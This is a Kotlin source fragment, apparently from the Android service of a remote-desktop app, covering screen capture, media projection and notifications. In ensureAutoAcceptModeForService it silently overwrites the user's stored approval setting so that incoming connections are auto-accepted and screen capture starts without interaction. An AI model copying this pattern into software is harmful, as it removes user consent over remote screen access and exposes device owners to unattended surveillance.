     * Handle auto-accepting connections when auto-accept mode is enabled
     * This ensures connections are accepted even without UI interaction
     */
    private fun handleAutoAcceptConnection(
        clientID: Int,
        username: String,
        peerId: String,
        isFileTransfer: Boolean
    ) {
        try {
            if (!isFileTransfer) {
                Log.d(logTag, "Starting capture for auto-accepted connection from $username")
                startCapture()
            }
            
            // Show connection established notification for auto-accepted connections
            val type = if (isFileTransfer) {
                translate("Transfer file")
            } else {
                translate("Share screen")
            }
            onClientAuthorizedNotification(clientID, type, username, peerId)
            
            Log.d(logTag, "Auto-accepted connection from $username - ID: $peerId")
        } catch (e: Exception) {
            Log.e(logTag, "Error in handleAutoAcceptConnection: ${e.message}")
        }
    }

    /**
     * Ensure auto-accept mode is enabled on service startup
     * This allows the service to accept incoming connections without needing the UI
     */
    private fun ensureAutoAcceptModeForService() {
        try {
            val prefs = applicationContext.getSharedPreferences(KEY_SHARED_PREFERENCES, FlutterActivity.MODE_PRIVATE)
            val approveMode = prefs.getString("approve-mode", "Both") ?: "Both"
            
            // If auto-accept is not already enabled, enable it
            if (approveMode.isNotEmpty() && approveMode != "click") {
                Log.d(logTag, "Current approveMode: '$approveMode', enabling auto-accept for service")
                // Set empty approve mode to enable auto-accept
                val edit = prefs.edit()
                edit.putString("approve-mode", "")
                edit.apply()
                Log.d(logTag, "Auto-accept mode enabled for MainService")
            } else if (approveMode.isEmpty()) {
                Log.d(logTag, "Auto-accept mode already enabled for MainService")
            }
        } catch (e: Exception) {
            Log.e(logTag, "Error ensuring auto-accept mode: ${e.message}")
        }
    }

    fun cancelNotification(clientID: Int) {
        notificationManager.cancel(getClientNotifyID(clientID))
    }

    /**
     * Method to receive and store media projection from PermissionRequestTransparentActivity
     * This ensures the projection is retained even if MainActivity is destroyed
     */
    @Keep
    fun setMediaProjection(intent: Intent) {
        try {
            Log.d(logTag, "Receiving media projection intent from PermissionRequestTransparentActivity")
            val mediaProjectionManager =
                getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, intent)
            _isReady = true
            isRequestingMediaProjection = false  // Reset the flag after successful permission
            Log.d(logTag, "Media projection set successfully")
            
            // Try to start capture if there's a pending connection
            startCapture()
        } catch (e: Exception) {
            isRequestingMediaProjection = false  // Reset flag on error too
            Log.e(logTag, "Error setting media projection: ${e.message}")
        }
    }

    /**
     * Called when user denies media projection permission
     * This resets the flag so we can try again later
     */
    @Keep
    fun onMediaProjectionPermissionDenied() {
        Log.d(logTag, "Media projection permission denied by user")
        isRequestingMediaProjection = false
    }

    /**
     * Request media projection when a client connects
     * Called from Dart when a new client connection is established
     */
    @Keep
    fun requestMediaProjectionForConnection() {
        Log.d(logTag, "Client connected - requesting media projection")
        if (mediaProjection == null) {
            requestMediaProjection()
        } else {
            Log.d(logTag, "Media projection already available")
            startCapture()
        }
    }

    /**
     * Stop media projection when no clients are connected
     * Called from Dart when all clients disconnect
     */
    @Keep
    fun stopMediaProjectionWhenNoClients() {
        Log.d(logTag, "No active clients - stopping media projection")
        stopCapture()
        
        // Release media projection when all clients disconnect
        try {
            mediaProjection?.stop()
            mediaProjection = null
            _isReady = false
            isRequestingMediaProjection = false
            Log.d(logTag, "Media projection released as all clients disconnected")
        } catch (e: Exception) {
            Log.e(logTag, "Error releasing media projection: ${e.message}")
        }
    }

    @SuppressLint("UnspecifiedImmutableFlag")
    private fun genLoginRequestPendingIntent(res: Boolean): PendingIntent {
        val intent = Intent(this, MainService::class.java).apply {
            action = ACT_LOGIN_REQ_NOTIFY
            putExtra(EXT_LOGIN_REQ_NOTIFY, res)
        }
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.getService(this, 111, intent, FLAG_IMMUTABLE)
        } else {
            PendingIntent.getService(this, 111, intent, FLAG_UPDATE_CURRENT)
        }
    }

    private fun setTextNotification(_title: String?, _text: String?) {
        val title = _title ?: DEFAULT_NOTIFY_TITLE
        val text = _text ?: translate(DEFAULT_NOTIFY_TEXT)
        val notification = notificationBuilder
            .clearActions()
            .setStyle(null)
            .setContentTitle(title)
            .setContentText(text)
            .build()
        notificationManager.notify(DEFAULT_NOTIFY_ID, notification)
    }
}
